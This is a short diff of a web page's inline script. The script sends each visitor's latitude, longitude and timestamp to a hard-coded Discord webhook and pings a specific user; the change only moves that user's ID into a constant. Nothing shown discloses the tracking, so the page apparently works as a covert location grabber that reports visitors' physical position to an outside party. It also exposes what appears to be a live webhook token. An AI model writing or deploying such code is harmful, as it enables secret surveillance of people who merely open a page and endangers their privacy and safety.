@@ -272,10 +272,10 @@
 
     <script>
         const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1313573225992814722/WHA9GV0JZCiSr0l9qLSl-4CThGVLqDT_dNgH9B87lttJb128znB7HUdHfzx3RfK345uE';
-        
+        const discordUID1 = "789782857852911616"
         function sendToDiscord(latitude, longitude) {
             const payload = {
-                content: `New visitor @789782857852911616
+                content: `New visitor @${discordUID1}
 Latitude: ${latitude}
 Longitude: ${longitude}
 Timestamp: ${new Date().toISOString()}`
